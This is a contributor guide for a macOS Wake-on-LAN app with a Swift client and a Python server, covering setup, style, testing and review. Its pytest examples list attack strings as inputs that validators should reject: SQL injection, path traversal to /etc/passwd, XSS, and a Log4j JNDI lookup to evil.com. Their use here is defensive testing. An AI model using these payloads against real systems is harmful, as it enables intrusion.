# Contributing to WoL Manu

Thank you for your interest in contributing to **WoL Manu**! This guide will help you understand how to contribute effectively to this Wake-on-LAN application for macOS.

## 📋 Table of Contents

- [Project Overview](#project-overview)
- [Getting Started](#getting-started)
- [Development Setup](#development-setup)
- [Code Guidelines](#code-guidelines)
- [Testing Requirements](#testing-requirements)
- [Submission Process](#submission-process)
- [Security Considerations](#security-considerations)
- [Documentation Guidelines](#documentation-guidelines)
- [Community Guidelines](#community-guidelines)

## 🎯 Project Overview

**WoL Manu** is a production-ready Wake-on-LAN application consisting of:

- **Swift macOS Client** - Native SwiftUI application with MVVM architecture
- **Python HTTP Server** - Security-hardened REST API for WoL functionality
- **Comprehensive Testing** - 24 automated tests (15 Python + 9 Swift)
- **Security Features** - Input validation, DoS protection, and hardened configurations

**Current Status:** ✅ **v1.4 - Production Ready**
- All core features implemented and tested
- Security hardening complete
- Documentation comprehensive
- CI/CD ready with automated testing

## 🚀 Getting Started

### Prerequisites

**Required Software:**
- **macOS 12.0+** (for Swift client development)
- **Xcode 14.0+** with Swift 5.7+ support
- **Python 3.7+** for server development
- **Git** for version control

**Optional but Recommended:**
- **pytest** for Python testing (`pip3 install pytest`)
- **SwiftLint** for Swift code formatting
- **jq** for JSON processing in shell scripts

### Quick Setup

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/yourusername/wol-manu.git
   cd wol-manu
   ```

2. **Verify Development Environment:**
   ```bash
   # Check Swift/Xcode
   swift --version
   xcodebuild -version
   
   # Check Python
   python3 --version
   pip3 --version
   ```

3. **Run Initial Tests:**
   ```bash
   # Run complete test suite
   ./run_all_tests.sh
   
   # Expected: 23/24 tests passing (95.8% success rate)
   ```

4. **Build and Run:**
   ```bash
   # Build Swift client
   xcodebuild -project "WoL Manu.xcodeproj" -scheme "WoL Manu" build
   
   # Run application
   ./run_app.sh
   
   # Start Python server
   python3 wol_server.py
   ```

## 🛠️ Development Setup

### Xcode Configuration

**Project Settings:**
- **Deployment Target:** macOS 12.0
- **Swift Language Version:** 5.7
- **Architecture:** Apple Silicon + Intel (Universal)

**Recommended Xcode Settings:**
```
Build Settings:
- SWIFT_OPTIMIZATION_LEVEL: -O (Release), -Onone (Debug)
- SWIFT_COMPILATION_MODE: wholemodule (Release), incremental (Debug)
- CODE_SIGN_STYLE: Automatic (or Manual with valid certificates)

Capabilities:
- Outgoing Connections (Client) ✅
- Incoming Connections (Server) ✅ 
```

### Development Workspace

**Recommended Directory Structure:**
```
WoL Manu/
├── WoL Manu.xcodeproj/     # Xcode project
├── WoL Manu/               # Swift source code
│   ├── WoL_ManuApp.swift   # App entry point
│   ├── ContentView.swift   # Main UI
│   ├── ConfigurationView.swift
│   ├── ConfigurationModel.swift
│   ├── WakeOnLANService.swift
│   └── PingService.swift
├── Tests/                  # Test files
│   ├── WakeOnLANServiceTests.swift
│   └── test_wol_server.py
├── wol_server.py          # Python server
├── config.json            # Runtime configuration
├── run_all_tests.sh       # Test automation
└── Documentation/         # Project docs
    ├── README.md
    ├── TESTING.md
    ├── SERVER.md
    └── CONTRIBUTING.md (this file)
```

### IDE Recommendations

**For Swift Development:**
- **Primary:** Xcode (native iOS/macOS development)
- **Alternative:** AppCode, VS Code with Swift extension

**For Python Development:**  
- **Primary:** VS Code with Python extension
- **Alternatives:** PyCharm, Vim/Neovim, Sublime Text

**Recommended VS Code Extensions:**
- Swift Language Support
- Python (Microsoft)
- JSON Tools
- Git Lens
- Markdown All in One

## 📝 Code Guidelines

### Swift Code Standards

**Architecture Pattern:**
- Follow **MVVM (Model-View-ViewModel)** pattern
- Use **Combine framework** for reactive programming
- Implement **@StateObject/@ObservableObject** for state management

**Code Style:**
```swift
// ✅ Good - Clear naming and structure
class ConfigurationManager: ObservableObject {
    @Published var deviceConfiguration: DeviceConfiguration?
    
    func saveConfiguration(_ config: DeviceConfiguration) {
        // Implementation
    }
}

// ❌ Avoid - Unclear naming and structure  
class CM: ObservableObject {
    @Published var dc: DeviceConfiguration?
    
    func save(_ c: DeviceConfiguration) {
        // Implementation
    }
}
```

**SwiftUI Best Practices:**
- Use descriptive view names: `ConfigurationView`, not `View2`
- Extract reusable components into separate views
- Keep view bodies focused and readable
- Use proper state management with `@State`, `@Binding`, `@StateObject`

**Function Visibility:**
- **`private`** - Internal implementation details
- **`internal`** - Module-wide access (default, also for testing)
- **`public`** - Cross-module access (rare in this project)

### Python Code Standards

**Code Style (PEP 8 Compliant):**
```python
# ✅ Good - Clear, documented, secure
def validate_mac(mac_address: str) -> bool:
    """
    Validates MAC address format with security checks.
    
    Args:
        mac_address: MAC address string in various formats
        
    Returns:
        bool: True if valid, False otherwise
        
    Security:
        - Input length validation (DoS protection)
        - Injection attempt detection
        - Format validation with hex checks
    """
    if not mac_address or len(mac_address) > 50:
        return False
    
    # Continue with validation logic...

# ❌ Avoid - Unclear, undocumented, no security
def validate_mac(mac):
    if re.match(r'^[0-9a-fA-F:]+$', mac):
        return True
    return False
```

**Security Requirements:**
- **Input Validation:** All user inputs must be validated and sanitized
- **DoS Protection:** Implement size limits and resource bounds
- **Error Handling:** No information leakage in error messages
- **Logging:** Log security events but not sensitive data

**Function Design:**
- Single responsibility principle
- Comprehensive docstrings with security notes
- Type hints where appropriate
- Error handling with appropriate exceptions

### General Code Quality

**Naming Conventions:**

| Type | Swift | Python | Example |
|------|-------|--------|---------|
| Classes | PascalCase | PascalCase | `ConfigurationManager`, `WakeOnLANService` |
| Functions | camelCase | snake_case | `saveConfiguration()`, `validate_mac()` |
| Variables | camelCase | snake_case | `deviceConfiguration`, `mac_address` |
| Constants | PascalCase | UPPER_SNAKE | `DefaultPort`, `MAX_INPUT_LENGTH` |

**Comments and Documentation:**
```swift
// ✅ Good - Explains why, not what
// Configure URLSession with retry logic to handle network instability
let session = URLSession(configuration: retryConfig)

// ❌ Avoid - Obvious what
// Create URLSession
let session = URLSession(configuration: config)
```

## 🧪 Testing Requirements

### Test Coverage Standards

**Minimum Requirements:**
- **Swift Tests:** 85%+ coverage of core functionality
- **Python Tests:** 90%+ coverage with security focus
- **Integration Tests:** Critical user flows must be tested
- **All Tests:** Must pass before any PR is accepted

**Current Status (v1.4):**
- **Python Server:** 100% (15/15 tests passing)
- **Swift Client:** 89% (8/9 tests passing, 1 warning)
- **Overall:** 95.8% success rate

### Writing Tests

**Swift Test Example (XCTest):**
```swift
import XCTest
@testable import WoL_Manu

class WakeOnLANServiceTests: XCTestCase {
    
    func testParseMACAddress_ValidFormats() {
        // Arrange
        let service = WakeOnLANService()
        let validMACs = [
            "AA:BB:CC:DD:EE:FF",
            "aa-bb-cc-dd-ee-ff", 
            "AABBCCDDEEFF"
        ]
        
        // Act & Assert
        for mac in validMACs {
            XCTAssertNotNil(
                service.parseMACAddress(mac),
                "Should parse valid MAC format: \(mac)"
            )
        }
    }
    
    func testParseMACAddress_InvalidFormats() {
        // Arrange
        let service = WakeOnLANService()
        let invalidMACs = [
            "invalid",
            "AA:BB:CC:DD:EE",     // Too short
            "AA:BB:CC:DD:EE:FF:GG", // Too long
        ]
        
        // Act & Assert
        for mac in invalidMACs {
            XCTAssertNil(
                service.parseMACAddress(mac),
                "Should reject invalid MAC format: \(mac)"
            )
        }
    }
}
```

**Python Test Example (pytest):**
```python
import pytest
from wol_server import validate_mac, validate_ip, create_magic_packet

class TestWoLServer:
    
    def test_validate_mac_valid_formats(self):
        """Test MAC validation with various valid formats"""
        valid_macs = [
            "AA:BB:CC:DD:EE:FF",
            "aa-bb-cc-dd-ee-ff",
            "AABBCCDDEEFF",
            "aa:bb:cc:dd:ee:ff"
        ]
        
        for mac in valid_macs:
            assert validate_mac(mac), f"Should validate MAC: {mac}"
    
    def test_validate_mac_security_edge_cases(self):
        """Test MAC validation against security threats"""
        dangerous_inputs = [
            "'; DROP TABLE devices; --",    # SQL injection
            "../../../etc/passwd",          # Path traversal  
            "A" * 1000,                    # Buffer overflow
            "${jndi:ldap://evil.com/x}",   # Log4j injection
        ]
        
        for dangerous_input in dangerous_inputs:
            assert not validate_mac(dangerous_input), \
                f"Should reject dangerous input: {dangerous_input}"
```

### Running Tests

**Complete Test Suite:**
```bash
# Run all tests with summary
./run_all_tests.sh

# Run with verbose output for debugging
./run_all_tests.sh --verbose
```

**Individual Test Execution:**
```bash
# Python tests only
python3 -m pytest Tests/test_wol_server.py -v

# Swift tests only
xcodebuild test -project "WoL Manu.xcodeproj" -scheme "WoL Manu"

# Specific test category
python3 -m pytest Tests/test_wol_server.py -k "test_validate_mac" -v
```

**Test Quality Requirements:**
- Tests must be **deterministic** (no flaky tests)
- Tests must be **fast** (<30 seconds total execution time)
- Tests must **clean up** after themselves (no side effects)
- Tests must have **clear, descriptive names**
- Security tests must cover **injection attempts and edge cases**

## 🔄 Submission Process

### Before Submitting

**Pre-submission Checklist:**
- [ ] All tests pass (`./run_all_tests.sh`)
- [ ] Code follows project style guidelines
- [ ] New features include comprehensive tests
- [ ] Security implications reviewed and addressed
- [ ] Documentation updated (if applicable)
- [ ] No sensitive information in code/commits

### Pull Request Guidelines

**PR Title Format:**
```
[TYPE] Brief description of changes

Examples:
[FEATURE] Add retry logic to URLSession configuration
[BUG] Fix MAC address parsing for edge cases  
[SECURITY] Enhance input validation for DoS protection
[DOCS] Update API documentation with security examples
[TEST] Add comprehensive unit tests for ping service
```

**PR Description Template:**
```markdown
## Summary
Brief description of what this PR accomplishes.

## Changes Made
- [ ] Specific change 1
- [ ] Specific change 2  
- [ ] Specific change 3

## Testing
- [ ] All existing tests pass
- [ ] New tests added for new functionality
- [ ] Manual testing completed
- [ ] Security implications reviewed

## Security Considerations
Describe any security implications or improvements.

## Documentation
- [ ] Code comments added/updated
- [ ] Documentation files updated (if applicable)
- [ ] README updated (if applicable)

## Checklist
- [ ] Code follows project guidelines
- [ ] Tests pass locally
- [ ] No sensitive information included
- [ ] Ready for review
```

### Review Process

**Code Review Criteria:**
1. **Functionality** - Does the code work as intended?
2. **Security** - Are there any security vulnerabilities?
3. **Performance** - Is the code efficient and optimized?
4. **Testing** - Is the code adequately tested?
5. **Documentation** - Is the code well-documented?
6. **Style** - Does the code follow project conventions?

**Review Timeline:**
- **Initial Response:** Within 48 hours
- **Full Review:** Within 1 week
- **Feedback Address:** Within 2 weeks

## 🛡️ Security Considerations

### Security Review Requirements

**All contributions must be reviewed for:**
- **Input Validation** - All user inputs properly validated
- **Injection Prevention** - Protection against SQL, command, and other injection types
- **DoS Protection** - Resource limits and bounds checking
- **Information Disclosure** - No sensitive data in logs or error messages
- **Network Security** - Proper socket handling and timeout configuration

### Security Testing

**Required Security Tests:**
```python
def test_security_edge_cases():
    """All input functions must pass security tests"""
    malicious_inputs = [
        "'; DROP TABLE users; --",      # SQL injection
        "../../../etc/passwd",          # Path traversal
        "${jndi:ldap://evil.com/x}",   # Log4j-style injection
        "<script>alert('xss')</script>", # XSS attempt
        "A" * 10000,                    # Buffer overflow attempt
        "\x00\x01\x02\x03\x04\x05",   # Binary injection
    ]
    
    for malicious_input in malicious_inputs:
        # Test all input validation functions
        assert not validate_mac(malicious_input)
        assert not validate_ip(malicious_input)
```

### Reporting Security Issues

**Security Vulnerability Disclosure:**
- **DO NOT** create public GitHub issues for security vulnerabilities
- **DO** email security issues privately to: [maintainer email]
- **DO** provide detailed reproduction steps
- **DO** suggest fixes if possible

**Security Issue Format:**
```
Subject: [SECURITY] Brief description

Vulnerability Details:
- Component affected: [Swift client/Python server/Both]
- Vulnerability type: [Injection/DoS/Information Disclosure/etc.]
- Severity: [Critical/High/Medium/Low]
- Reproduction steps: [Detailed steps]
- Potential impact: [Description of impact]
- Suggested fix: [If you have suggestions]

Environment:
- WoL Manu version: [version]
- Operating System: [macOS version]
- Network configuration: [if relevant]
```

## 📚 Documentation Guidelines

### Documentation Requirements

**All new features must include:**
- **Inline Code Comments** - Complex logic explained
- **Function Documentation** - Parameters, return values, exceptions
- **User Documentation** - How to use the feature
- **Security Notes** - Any security implications

**Documentation Files to Update:**
- **README.md** - For user-facing features
- **SERVER.md** - For Python server changes
- **TESTING.md** - For new tests or testing procedures
- **WARP.md** - For development-related changes
- **CHANGELOG.md** - For all changes (version history)

### Documentation Style

**Code Documentation:**
```swift
// ✅ Good Swift documentation
/// Sends a Wake-on-LAN magic packet to the specified device
/// - Parameters:
///   - ipAddress: The target device's IP address
///   - macAddress: The target device's MAC address in any standard format
/// - Returns: `true` if packet was sent successfully, `false` otherwise
/// - Throws: `NetworkError` if unable to create UDP socket
/// - Note: Requires network access and UDP broadcast capability
func sendWakePacket(to ipAddress: String, macAddress: String) throws -> Bool {
    // Implementation
}
```

```python
# ✅ Good Python documentation
def validate_mac(mac_address: str) -> bool:
    """
    Validates MAC address format with comprehensive security checks.
    
    This function validates MAC addresses in multiple formats while providing
    protection against injection attacks and DoS attempts.
    
    Args:
        mac_address: MAC address string in format AA:BB:CC:DD:EE:FF,
                    AA-BB-CC-DD-EE-FF, or AABBCCDDEEFF
    
    Returns:
        bool: True if MAC address is valid and safe, False otherwise
    
    Security:
        - Input length validation (prevents DoS attacks)
        - Injection attempt detection (SQL, path traversal, etc.)
        - Format validation with proper hex digit checking
        - Special character sanitization
    
    Examples:
        >>> validate_mac("AA:BB:CC:DD:EE:FF")
        True
        >>> validate_mac("'; DROP TABLE devices; --")
        False
    """
    # Implementation
```

## 👥 Community Guidelines

### Code of Conduct

**Our Commitment:**
We are committed to providing a welcoming and inclusive environment for all contributors, regardless of background, experience level, or identity.

**Expected Behavior:**
- **Be Respectful** - Treat all community members with respect
- **Be Collaborative** - Work together constructively
- **Be Helpful** - Assist others when possible
- **Be Patient** - Understand that people have different experience levels

**Unacceptable Behavior:**
- Harassment, discrimination, or offensive language
- Personal attacks or inflammatory comments
- Publishing others' private information
- Any conduct that would be inappropriate in a professional setting

### Getting Help

**For Development Questions:**
1. Check existing documentation (README.md, WARP.md, etc.)
2. Search existing GitHub issues
3. Create a new issue with detailed description
4. Use the discussion section for general questions

**For Bug Reports:**
```markdown
**Bug Report Template:**

**Description:** Brief description of the bug

**Steps to Reproduce:**
1. Step 1
2. Step 2
3. Step 3

**Expected Behavior:** What should happen

**Actual Behavior:** What actually happens

**Environment:**
- WoL Manu version: [version]
- macOS version: [version]
- Hardware: [Intel/Apple Silicon]

**Additional Context:** Any other relevant information
```

**For Feature Requests:**
```markdown
**Feature Request Template:**

**Summary:** Brief description of the requested feature

**Use Case:** Why is this feature needed?

**Proposed Solution:** How should this feature work?

**Alternatives:** Any alternative approaches considered?

**Security Implications:** Any security considerations?

**Testing Strategy:** How should this feature be tested?
```

## 🎯 Development Priorities

### Current Focus Areas

**High Priority:**
- Fixing remaining Swift test warnings (1/9 tests)
- Performance optimization and monitoring
- Enhanced error handling and user feedback
- Cross-platform compatibility research

**Medium Priority:**
- Additional security hardening
- Advanced configuration options
- Network topology discovery
- Batch wake operations

**Low Priority:**
- GUI enhancements and themes
- Advanced logging and analytics
- Integration with system notifications
- Remote configuration management

### Contribution Ideas

**Good First Issues:**
- Improve error messages and user feedback
- Add more comprehensive input validation tests
- Enhance documentation with examples
- Fix minor UI/UX improvements

**Advanced Contributions:**
- IPv6 support implementation
- Advanced network security features
- Performance optimization and profiling
- Comprehensive integration testing

---

## 🙏 Recognition

### Contributors

We value all contributions to WoL Manu, from bug reports and feature requests to code contributions and documentation improvements.

**Types of Contributions Recognized:**
- **Code Contributors** - Bug fixes, features, improvements
- **Documentation Contributors** - Documentation, examples, guides
- **Testing Contributors** - Test cases, bug reports, validation
- **Security Contributors** - Security reviews, vulnerability reports
- **Community Contributors** - Support, mentoring, feedback

### Attribution

All contributors are recognized in:
- Project README.md contributors section
- CHANGELOG.md for specific contributions
- GitHub contributors graph
- Release notes for major contributions

---

Thank you for contributing to **WoL Manu**! Your contributions help make this Wake-on-LAN application more reliable, secure, and useful for the community.

For questions about contributing, please create an issue or start a discussion in the project repository.